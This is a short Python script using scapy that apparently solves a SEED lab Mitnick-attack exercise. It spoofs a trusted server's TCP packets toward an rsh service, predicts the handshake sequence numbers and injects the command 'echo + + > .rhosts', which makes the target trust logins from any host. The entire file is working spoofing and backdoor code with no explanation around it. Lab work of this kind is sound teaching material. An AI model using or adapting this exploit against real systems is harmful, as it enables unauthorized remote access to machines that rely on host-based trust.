#!usr/bin/python3

from scapy.all import*

x_ip = "10.9.0.5"
x_port = 514 
x_port1=1023
srv_ip = "10.9.0.6"
srv_port = 1023
srv_port1= 9090

def spoof_pkt(pkt):
	Seq=123456789 + 1
	old_ip=pkt[IP]
	old_tcp=pkt[TCP]

	if old_tcp.flags=="SA": 
		ip=IP(src=srv_ip,dst=x_ip) 
		tcp=TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

		data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
		pkt = ip/tcp/data
		send(pkt,verbose=0)
	       
	if old_tcp.flags=='S' and old_tcp.dport == srv_port1 and old_ip.dst == srv_ip:
		Seqence=123456788
		ip=IP(src=srv_ip,dst=x_ip)
		tcp=TCP(sport=srv_port1, dport=x_port1, flags="SA", seq=Seqence, ack=old_ip.seq + 1)
		pkt=ip/tcp
		send(pkt, verbose=0)

def spoofing_SYNPacket():
	ip = IP(src=srv_ip, dst=x_ip)
	tcp = TCP(sport=srv_port,dport=x_port,flags="S", seq=123456789)
	pkt = ip/tcp
	send(pkt,verbose=0)


def main():
	spoofing_SYNPacket()
	# Write interface of attack container
	pkt=sniff(iface='', filter="tcp and src host 10.9.0.5", prn=spoof_pkt) 

if __name__ == "__main__":
	main()

	
